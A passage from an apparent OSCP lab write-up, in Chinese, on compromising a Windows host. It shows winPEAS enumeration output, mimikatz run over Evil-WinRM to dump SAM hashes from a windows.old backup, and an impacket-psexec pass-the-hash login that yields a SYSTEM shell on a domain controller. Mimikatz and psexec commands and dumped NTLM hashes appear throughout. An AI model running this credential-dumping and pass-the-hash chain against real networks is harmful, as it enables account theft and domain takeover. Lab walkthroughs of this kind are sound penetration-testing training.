  UDP        0.0.0.0               500           *:*                            2032              svchost
  UDP        0.0.0.0               4500          *:*                            2032              svchost
  UDP        0.0.0.0               5050          *:*                            5656              svchost
  UDP        0.0.0.0               5353          *:*                            1112              svchost
  UDP        0.0.0.0               5355          *:*                            1112              svchost
  UDP        10.10.105.142         137           *:*                            4                 System
  UDP        10.10.105.142         138           *:*                            4                 System
  UDP        10.10.105.142         1900          *:*                            4748              svchost
  UDP        10.10.105.142         62720         *:*                            4748              svchost
  UDP        127.0.0.1             1900          *:*                            4748              svchost
  UDP        127.0.0.1             53830         *:*                            2160              svchost
  UDP        127.0.0.1             61946         *:*                            1380              svchost
  UDP        127.0.0.1             62721         *:*                            4748              svchost
  UDP        127.0.0.1             64596         *:*                            700               lsass

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        [::]                                        123           *:*                            544               svchost
  UDP        [::]                                        500           *:*                            2032              svchost
  UDP        [::]                                        4500          *:*                            2032              svchost
  UDP        [::1]                                       1900          *:*                            4748              svchost
  UDP        [::1]                                       62719         *:*                            4748              svchost

ÉÍÍÍÍÍÍÍÍÍÍ¹ Firewall Rules
È Showing only DENY rules (too many ALLOW rules always)
    Current Profiles: DOMAIN
    FirewallEnabled (Domain):    False
    FirewallEnabled (Private):    False
    FirewallEnabled (Public):    False
    DENY rules:

ÉÍÍÍÍÍÍÍÍÍÍ¹ DNS cached --limit 70--
    Entry                                 Name                                  Data
  [X] Exception: Access denied

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Internet settings, zone and proxy configuration
  General Settings
  Hive        Key                                       Value
  HKCU        CertificateRevocation                     1
  HKCU        DisableCachingOfSSLPages                  0
  HKCU        IE5_UA_Backup_Flag                        5.0
  HKCU        PrivacyAdvanced                           1
  HKCU        SecureProtocols                           2688
  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU        ZonesSecurityUpgrade                      System.Byte[]
  HKCU        WarnonZoneCrossing                        0
  HKCU        EnableNegotiate                           1
  HKCU        ProxyEnable                               0
  HKCU        MigrateProxy                              1
  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files
  HKLM        CodeBaseSearchPath                        CODEBASE
  HKLM        EnablePunycode                            1
  HKLM        MinorVersion                              0
  HKLM        WarnOnIntranet                            1

  Zone Maps
  No URLs configured

  Zone Auth Settings
  No Zone Auth Settings


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Windows Credentials ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Windows Vault
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault
  [ERROR] Unable to enumerate vaults. Error (0x-2146892987)
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Credential manager
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


  [!] Unable to enumerate credentials automatically, error: 'Win32Exception: System.ComponentModel.Win32Exception (0x80004005): A specified logon session does not exist. It may already have been terminated'
Please run:
cmdkey /list

ÉÍÍÍÍÍÍÍÍÍÍ¹ Saved RDP connections
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Remote Desktop Server/Client Settings
  RDP Server Settings
    Network Level Authentication            :
    Block Clipboard Redirection             :
    Block COM Port Redirection              :
    Block Drive Redirection                 :
    Block LPT Port Redirection              :
    Block PnP Device Redirection            :
    Block Printer Redirection               :
    Allow Smart Card Redirection            :

  RDP Client Settings
    Disable Password Saving                 :       True
    Restricted Remote Administration        :       False

ÉÍÍÍÍÍÍÍÍÍÍ¹ Recently run commands
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    MasterKey: C:\Users\celia.almeda\AppData\Roaming\Microsoft\Protect\S-1-5-21-2610934713-1581164095-2706428072-1105\ed3fcd49-2ed1-47e0-8a6c-9d08a534a403
    Accessed: 8/1/2023 8:36:10 AM
    Modified: 4/1/2022 10:14:42 AM
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    CredFile: C:\Users\celia.almeda\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data

    MasterKey: ed3fcd49-2ed1-47e0-8a6c-9d08a534a403
    Accessed: 4/4/2022 6:22:45 AM
    Modified: 4/1/2022 10:14:49 AM
    Size: 11020
   =================================================================================================

È Follow the provided link for further instructions in how to decrypt the creds file

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for RDCMan Settings Files
È Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#remote-desktop-credential-manager
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Kerberos tickets
È  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
    serverName: ms02$
    RealmName:
    StartTime: 8/1/2023 8:36:09 AM
    EndTime: 8/1/2023 8:51:09 AM
    RenewTime: 8/8/2023 7:00:52 AM
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, pre_authent, renewable, forwardable
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for saved Wifi credentials
  [X] Exception: The service has not been started
Enumerating WLAN using wlanapi.dll failed, trying to enumerate using 'netsh'
No saved Wifi credentials found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking AppCmd.exe
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd.exe
    Not Found
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking SSClient.exe
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scclient-sccm
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating SSCM - System Center Configuration Manager settings

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Security Packages Credentials
  [X] Exception: Couldn't parse nt_resp. Len: 0 Message bytes: 4e544c4d5353500003000000010001006000000000000000610000000000000058000000000000005800000008000800580000000000000061000000058a80a20a00614a0000000ffe1d3c8f74f170f3fc1f63658c480cf94d0053003000320000


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Browsers Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Firefox
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Firefox DBs
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Firefox history
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Chrome
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Chrome DBs
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Chrome history
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Chrome bookmarks
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Opera
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Brave Browser
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Internet Explorer (unsupported)
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current IE tabs
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
  [X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.UnauthorizedAccessException: Access is denied.

   --- End of inner exception stack trace ---
   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)
   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)
   at winPEAS.KnownFileCreds.Browsers.InternetExplorer.GetCurrentIETabs()
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in IE history
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history


ÉÍÍÍÍÍÍÍÍÍÍ¹ IE history -- limit 50

    http://go.microsoft.com/fwlink/p/?LinkId=255141

ÉÍÍÍÍÍÍÍÍÍÍ¹ IE favorites
    http://go.microsoft.com/fwlink/p/?LinkId=255142


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting files and registry ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty Sessions
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty SSH Host keys
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ SSH keys in registry
È If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#ssh-keys-in-registry
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ SuperPutty configuration files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Office 365 endpoints synced by OneDrive.

    SID: S-1-5-19
   =================================================================================================

    SID: S-1-5-20
   =================================================================================================

    SID: S-1-5-21-2610934713-1581164095-2706428072-1105
      Name:  Personal
        UserFolder                                 C:\Users\celia.almeda\OneDrive
   =================================================================================================

    SID: S-1-5-21-2610934713-1581164095-2706428072-500
   =================================================================================================

    SID: S-1-5-80-1985561900-798682989-2213159822-1904180398-3434236965
   =================================================================================================

    SID: S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133
   =================================================================================================

    SID: S-1-5-18
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Cloud Credentials
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Unattend Files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for common SAM & SYSTEM backups

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for McAfee Sitelist.xml Files
  [X] Exception: Could not load file or assembly 'AlphaFS, Version=2.2.0.0, Culture=neutral, PublicKeyToken=4d31a58f7d7ad5c9' or one of its dependencies. The system cannot find the file specified.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached GPP Passwords

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible regs with creds
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#inside-the-registry
    Not Found
    Not Found
    Not Found
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible password files in users homes
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching for Oracle SQL Developer config files


ÉÍÍÍÍÍÍÍÍÍÍ¹ Slack files & directories
  note: check manually if something is found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for LOL Binaries and Scripts (can be slow)
È  https://lolbas-project.github.io/
   [!] Check skipped, if you want to run it, please specify '-lolbas' argument

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Outlook download files


ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating machine and user certificate files


ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching known files that can contain creds in home
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for documents --limit 100--
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Office Most Recent Files -- limit 50

  Last Access Date           User                                           Application           Document

ÉÍÍÍÍÍÍÍÍÍÍ¹ Recent files --limit 70--
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking inside the Recycle Bin for creds files
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching hidden files or folders in C:\Users home (can be slow)


ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching interesting files in other users home directories (can be slow)

  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
Unhandled Exception: System.IO.FileNotFoundException: Could not load file or assembly 'AlphaFS, Version=2.2.0.0, Culture=neutral, PublicKeyToken=4d31a58f7d7ad5c9' or one of its dependencies. The system cannot find the file specified.   at winPEAS.Helpers.Search.SearchHelper.GetFilesFast(String folder, String pattern, HashSet`1 excludedDirs, Boolean isFoldersIncluded)   at winPEAS.Checks.FilesInfo.PrintExecutablesInNonDefaultFoldersWithWritePermissions()   at winPEAS.Helpers.CheckRunner.Run(Action action, Boolean isDebug, String description)   at System.Collections.Generic.List`1.ForEach(Action`1 action)   at winPEAS.Checks.Checks.RunChecks(Boolean isAllChecks, Boolean wait)   at winPEAS.Checks.Checks.<>c__DisplayClass29_0.<Run>b__1()   at winPEAS.Helpers.CheckRunner.Run(Action action, Boolean isDebug, String description)   at winPEAS.Checks.Checks.Run(String[] args)   at winPEAS.Program.Main(String[] args)
```

嘗試使用 mimikatz dump credential

先 upload mimikatz.exe (須將其放在當前 kali 目錄底下才能直接 upload)
```bash
upload mimikatz.exe
```

```json
*Evil-WinRM* PS C:\Users\celia.almeda\Desktop> cmd.exe /c mimikatz.exe "privilege::debug" "sekurlsa::logonpassword" exit > test4
*Evil-WinRM* PS C:\Users\celia.almeda\Desktop> type test4

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061

mimikatz(commandline) # sekurlsa::logonpassword
ERROR mimikatz_doLocal ; "logonpassword" command of "sekurlsa" module not found !

Module :	sekurlsa
Full name :	SekurLSA module
Description :	Some commands to enumerate credentials...

             msv  -  Lists LM & NTLM credentials
         wdigest  -  Lists WDigest credentials
        kerberos  -  Lists Kerberos credentials
           tspkg  -  Lists TsPkg credentials
         livessp  -  Lists LiveSSP credentials
         cloudap  -  Lists CloudAp credentials
             ssp  -  Lists SSP credentials
  logonPasswords  -  Lists all available providers credentials
         process  -  Switch (or reinit) to LSASS process  context
        minidump  -  Switch (or reinit) to LSASS minidump context
         bootkey  -  Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials
             pth  -  Pass-the-hash
          krbtgt  -  krbtgt!
     dpapisystem  -  DPAPI_SYSTEM secret
           trust  -  Antisocial
      backupkeys  -  Preferred Backup Master keys
         tickets  -  List Kerberos tickets
           ekeys  -  List Kerberos Encryption Keys
           dpapi  -  List Cached MasterKeys
         credman  -  List Credentials Manager

mimikatz(commandline) # exit
Bye!
```

因權限不足而無法成功

在 C:\ 底下發現一個 windows.old 資料夾，研判為備份檔
```json
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         12/7/2019   1:14 AM                PerfLogs
d-r---        12/19/2022  11:34 PM                Program Files
d-r---        11/10/2022   2:52 AM                Program Files (x86)
d-r---        11/14/2022   6:32 AM                Users
d-----        12/19/2022  11:38 PM                Windows
d-----          4/4/2022   6:00 AM                windows.old
```

進去查找發現 windows/system32 底下有 SAM & SYSTEM 檔案，可透過 mimikatz 分析
```json
*Evil-WinRM* PS C:\windows.old\Windows\System32> dir


    Directory: C:\windows.old\Windows\System32


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         12/7/2019   1:14 AM                AppLocker
d-----          4/4/2022   6:03 AM                Boot
d---s-          4/4/2022   6:03 AM                Configuration
d-----          4/4/2022   6:03 AM                DriverState
d-----          4/4/2022   6:03 AM                DriverStore
d-----          4/4/2022   6:04 AM                en-US
d---s-          4/4/2022   6:06 AM                Microsoft
-a----         12/7/2019   1:09 AM         113256 compmgmt.msc
-a----         12/7/2019   1:09 AM           9571 ResPriHMImageList
-a----         12/7/2019   1:09 AM           9196 ResPriHMImageListLowCost
-a----         12/7/2019   1:09 AM           8977 ResPriImageList
-a----         12/7/2019   1:09 AM           8690 ResPriImageListLowCost
-a----          4/4/2022   6:00 AM          57344 SAM
-a----          4/4/2022   6:00 AM       11636736 SYSTEM
-a----         3/25/2022   1:34 PM         230400 WorkFoldersShell.dll
-a----         3/25/2022   1:34 PM        2229576 workfolderssvc.dll
-a----         3/25/2022   1:31 PM         283648 wosc.dll
-a----         3/25/2022   1:32 PM         352816 wow64.dll
-a----         3/25/2022   1:32 PM          21288 wow64cpu.dll
-a----         3/25/2022   1:32 PM         531984 wow64win.dll
-a----         3/25/2022   1:33 PM          17920 wowreg32.exe
-a----         3/25/2022   1:31 PM         452608 WpAXHolder.dll
-a----         12/7/2019   1:08 AM         103424 wpbcreds.dll
-a----         3/25/2022   1:31 PM        1643008 Wpc.dll
-a----         3/25/2022   1:31 PM         336896 WpcApi.dll
-a----         12/7/2019   1:08 AM          10143 wpcatltoast.png
-a----         3/25/2022   1:31 PM        1867264 WpcDesktopMonSvc.dll
-a----         3/25/2022   1:31 PM        1173472 WpcMon.exe
-a----         12/7/2019   1:08 AM           4687 wpcmon.png
-a----        11/18/2020   6:48 PM          40448 WpcProxyStubs.dll
-a----         3/25/2022   1:34 PM          91648 WwanRadioManager.dll
-a----         3/25/2022   1:31 PM        1518080 wwansvc.dll
-a----        11/18/2020   6:48 PM          97600 wwapi.dll
-a----         3/25/2022   1:31 PM         233984 XamlTileRender.dll
-a----         12/7/2019   1:08 AM           3584 XAudio2_8.dll
-a----         3/25/2022   1:31 PM         623616 XAudio2_9.dll
-a----         3/25/2022   1:31 PM        1049088 XblAuthManager.dll
-a----         3/25/2022   1:31 PM          93696 XblAuthManagerProxy.dll
-a----         3/25/2022   1:31 PM         114688 XblAuthTokenBrokerExt.dll
-a----         3/25/2022   1:31 PM        1270272 XblGameSave.dll
-a----         12/7/2019   1:08 AM         159744 XblGameSaveExt.dll
-a----         12/7/2019   1:08 AM          39936 XblGameSaveProxy.dll
-a----        11/18/2020   6:48 PM          33792 XblGameSaveTask.exe
-a----         12/7/2019   1:08 AM            627 X_80.contrast-black.png
-a----         12/7/2019   1:08 AM            579 X_80.contrast-white.png
-a----         12/7/2019   1:08 AM            627 X_80.png
```

嘗試使用 mimikatz 分析 (記得再次 upload mimikatz.exe)
```json
*Evil-WinRM* PS C:\windows.old\Windows\System32> cmd.exe /c mimikatz.exe "lsadump::sam /sam:SAM /system:SYSTEM" exit > test2.hash
*Evil-WinRM* PS C:\windows.old\Windows\System32> type test2.hash

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::sam /sam:SAM /system:SYSTEM
Domain : DESKTOP-V5N446V
SysKey : 8bca2f7ad576c856d79b7111806b533d
Local SID : S-1-5-21-1613424066-3239774370-1740908391

SAMKey : 09d61754d6af5360b790098c5d83c918

RID  : 000001f4 (500)
User : Administrator

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: acbb9b77c62fdd8fe5976148a933177a

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 8b50b19c0d269eac976490739910dcac

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 832bd5f672dc4bdb818efec07368bbf501c93997b9c1c8e3c13508651f168bf4
      aes128_hmac       (4096) : 7dcef0c0859416a5a8d754188336c7a7
      des_cbc_md5       (4096) : c8bf468a3e626b1f

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : c8bf468a3e626b1f


RID  : 000003e9 (1001)
User : tom_admin
  Hash NTLM: 4979d69d4ca66955c075c41cf45f24dc

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 23adff370712fd331c2beecd09b604d2

* Primary:Kerberos-Newer-Keys *
    Default Salt : DESKTOP-V5N446Vtom_admin
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : bb3255f47a2412c66dd409cbf9b1298305eecece91748801355d7935f47ff40b
      aes128_hmac       (4096) : 6240089ed59b7a85e8987cf9ab22e4c5
      des_cbc_md5       (4096) : eac20ec4e56d92b6
    OldCredentials
      aes256_hmac       (4096) : bb3255f47a2412c66dd409cbf9b1298305eecece91748801355d7935f47ff40b
      aes128_hmac       (4096) : 6240089ed59b7a85e8987cf9ab22e4c5
      des_cbc_md5       (4096) : eac20ec4e56d92b6

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : DESKTOP-V5N446Vtom_admin
    Credentials
      des_cbc_md5       : eac20ec4e56d92b6
    OldCredentials
      des_cbc_md5       : eac20ec4e56d92b6


RID  : 000003ea (1002)
User : Cheyanne.Adams
  Hash NTLM: b3930e99899cb55b4aefef9a7021ffd0

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e1d38af7e9264758221376e0b5f31dd7

* Primary:Kerberos-Newer-Keys *
    Default Salt : DESKTOP-V5N446VCheyanne.Adams
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 771706e61bfc67181efb7417ed79b5f63d622b07a6971705dabefe1080aff44a
      aes128_hmac       (4096) : f68ecb8da50216512a6e3ece165d5c85
      des_cbc_md5       (4096) : 23bc6b08ecef867a
    OldCredentials
      aes256_hmac       (4096) : 771706e61bfc67181efb7417ed79b5f63d622b07a6971705dabefe1080aff44a
      aes128_hmac       (4096) : f68ecb8da50216512a6e3ece165d5c85
      des_cbc_md5       (4096) : 23bc6b08ecef867a

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : DESKTOP-V5N446VCheyanne.Adams
    Credentials
      des_cbc_md5       : 23bc6b08ecef867a
    OldCredentials
      des_cbc_md5       : 23bc6b08ecef867a


RID  : 000003eb (1003)
User : David.Rhys
  Hash NTLM: 9ac088de348444c71dba2dca92127c11

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 856151b51675604f5a195058e73153ad

* Primary:Kerberos-Newer-Keys *
    Default Salt : DESKTOP-V5N446VDavid.Rhys
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 73b81e6ada9d47cad0c0cbad59afca4d9dc36204c079b6c34e08596fa5ac87e8
      aes128_hmac       (4096) : 0a1a39939a0579e1c3ba4532b88d1761
      des_cbc_md5       (4096) : 52cef8b961735234
    OldCredentials
      aes256_hmac       (4096) : 73b81e6ada9d47cad0c0cbad59afca4d9dc36204c079b6c34e08596fa5ac87e8
      aes128_hmac       (4096) : 0a1a39939a0579e1c3ba4532b88d1761
      des_cbc_md5       (4096) : 52cef8b961735234

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : DESKTOP-V5N446VDavid.Rhys
    Credentials
      des_cbc_md5       : 52cef8b961735234
    OldCredentials
      des_cbc_md5       : 52cef8b961735234


RID  : 000003ec (1004)
User : Mark.Chetty
  Hash NTLM: 92903f280e5c5f3cab018bd91b94c771

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 81b13fb9c0fe9a576af8b732b94ee899

* Primary:Kerberos-Newer-Keys *
    Default Salt : DESKTOP-V5N446VMark.Chetty
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d0fd349b782ea05a29b99c81ca1d3dc88720bf8db857063a9f08584aad67e15d
      aes128_hmac       (4096) : 048ec3b5f44193affee10e36ab6de315
      des_cbc_md5       (4096) : fe1ccda4d5bc7c58
    OldCredentials
      aes256_hmac       (4096) : d0fd349b782ea05a29b99c81ca1d3dc88720bf8db857063a9f08584aad67e15d
      aes128_hmac       (4096) : 048ec3b5f44193affee10e36ab6de315
      des_cbc_md5       (4096) : fe1ccda4d5bc7c58

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : DESKTOP-V5N446VMark.Chetty
    Credentials
      des_cbc_md5       : fe1ccda4d5bc7c58
    OldCredentials
      des_cbc_md5       : fe1ccda4d5bc7c58


mimikatz(commandline) # exit
Bye!
```

找到多組 ntlm hash
```json
User : tom_admin
  Hash NTLM: 4979d69d4ca66955c075c41cf45f24dc

User : Cheyanne.Adams
  Hash NTLM: b3930e99899cb55b4aefef9a7021ffd0

User : David.Rhys
  Hash NTLM: 9ac088de348444c71dba2dca92127c11

User : Mark.Chetty
  Hash NTLM: 92903f280e5c5f3cab018bd91b94c771
```

嘗試使用 tom.admin pass the hash 登入 DC
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_A/141]
└─$ proxychains -q impacket-psexec -hashes :4979d69d4ca66955c075c41cf45f24dc tom_admin@10.10.131.140
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.131.140.....
[*] Found writable share ADMIN$
[*] Uploading file sBDaDdKN.exe
[*] Opening SVCManager on 10.10.131.140.....
[*] Creating service ecLc on 10.10.131.140.....
[*] Starting service ecLc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.131.140
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.131.254
```

成功！

```json
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 7093-9EA5

 Directory of C:\Users\Administrator\Desktop

04/05/2022  05:31 AM    <DIR>          .
04/05/2022  05:31 AM    <DIR>          ..
08/02/2023  05:53 AM                34 proof.txt
               1 File(s)             34 bytes
               2 Dir(s)  23,752,466,432 bytes free

tC:\Users\Administrator\Desktop>type proof.txt
51b160fbf908a608058fc238f7931196
```